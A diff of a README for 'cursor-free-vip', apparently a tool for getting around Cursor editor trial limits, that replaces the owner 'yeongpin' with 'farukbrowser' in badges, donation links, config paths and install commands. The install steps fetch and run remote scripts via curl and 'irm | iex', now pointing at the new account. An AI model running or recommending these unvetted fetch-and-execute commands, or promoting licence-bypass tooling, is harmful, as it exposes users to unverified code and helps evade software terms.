@@ -7,20 +7,20 @@
 
 <p align="center">
 
-[![Release](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/release/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
+[![Release](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/release/farukbrowser/cursor-free-vip)](https://github.com/farukbrowser/cursor-free-vip/releases/latest)
 [![License: CC BY-NC-ND 4.0](https://img.shields.io/badge/License-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![Stars](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/stars/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/stargazers)
-[![Downloads](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/downloads/yeongpin/cursor-free-vip/total)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
-<a href="https://buymeacoffee.com/yeongpin" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
- [<img src="https://devin.ai/assets/deepwiki-badge.png" alt="Ask DeepWiki.com" height="20"/>](https://deepwiki.com/yeongpin/cursor-free-vip)
+[![Stars](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/stars/farukbrowser/cursor-free-vip)](https://github.com/farukbrowser/cursor-free-vip/stargazers)
+[![Downloads](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/downloads/farukbrowser/cursor-free-vip/total)](https://github.com/farukbrowser/cursor-free-vip/releases/latest)
+<a href="https://buymeacoffee.com/farukbrowser" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
+ [<img src="https://devin.ai/assets/deepwiki-badge.png" alt="Ask DeepWiki.com" height="20"/>](https://deepwiki.com/farukbrowser/cursor-free-vip)
 
 </p>
 
 
-<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="yeongpin%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="farukbrowser%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 <br>
-<a href="https://www.buymeacoffee.com/yeongpin" target="_blank">
-      <img src="https://img.buymeacoffee.com/button-api/?text=buy me a coffee&emoji=☕&slug=yeongpin&button_colour=ffda33&font_colour=000000&font_family=Bree&outline_colour=000000&coffee_colour=FFDD00&latest=2" width="160" height='55' alt="Buy Me a Coffee"/>
+<a href="https://www.buymeacoffee.com/farukbrowser" target="_blank">
+      <img src="https://img.buymeacoffee.com/button-api/?text=buy me a coffee&emoji=☕&slug=farukbrowser&button_colour=ffda33&font_colour=000000&font_family=Bree&outline_colour=000000&coffee_colour=FFDD00&latest=2" width="160" height='55' alt="Buy Me a Coffee"/>
 </a>
 
 
@@ -75,7 +75,7 @@ For optimal performance, run with privileges and always stay up to date.
 ### **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://raw.githubusercontent.com/farukbrowser/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
 ```
 
 ### **Archlinux**
@@ -89,7 +89,7 @@ yay -S cursor-free-vip-git
 ### **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/farukbrowser/cursor-free-vip/main/scripts/install.ps1 | iex
 ```
 
 </details>
@@ -168,13 +168,13 @@ email = xxxxx@mailto.plus
 epin = 
 
 [WindowsPaths]
-storage_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\storage.json
-sqlite_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\state.vscdb
-machine_id_path = C:\Users\yeongpin\AppData\Roaming\Cursor\machineId
-cursor_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app
-updater_path = C:\Users\yeongpin\AppData\Local\cursor-updater
-update_yml_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app-update.yml
-product_json_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app\product.json
+storage_path = C:\Users\farukbrowser\AppData\Roaming\Cursor\User\globalStorage\storage.json
+sqlite_path = C:\Users\farukbrowser\AppData\Roaming\Cursor\User\globalStorage\state.vscdb
+machine_id_path = C:\Users\farukbrowser\AppData\Roaming\Cursor\machineId
+cursor_path = C:\Users\farukbrowser\AppData\Local\Programs\Cursor\resources\app
+updater_path = C:\Users\farukbrowser\AppData\Local\cursor-updater
+update_yml_path = C:\Users\farukbrowser\AppData\Local\Programs\Cursor\resources\app-update.yml
+product_json_path = C:\Users\farukbrowser\AppData\Local\Programs\Cursor\resources\app\product.json
 
 [Browser]
 default_browser = opera
@@ -186,7 +186,7 @@ chrome_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
 edge_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\msedgedriver.exe
 firefox_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\geckodriver.exe
 brave_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
-opera_path = C:\Users\yeongpin\AppData\Local\Programs\Opera\opera.exe
+opera_path = C:\Users\farukbrowser\AppData\Local\Programs\Opera\opera.exe
 opera_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
 
 [OAuth]
@@ -216,8 +216,8 @@ max_attempts = 3
 歡迎提交 Issue 和 Pull Request！
 
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://github.com/farukbrowser/cursor-free-vip/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=farukbrowser/cursor-free-vip&preview=true&max=&columns=" />
 </a>
 <br /><br />
 
@@ -247,7 +247,7 @@ by the user.
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://api.star-history.com/svg?repos=farukbrowser/cursor-free-vip&type=Date)](https://star-history.com/#farukbrowser/cursor-free-vip&Date)
 
 </div>
 
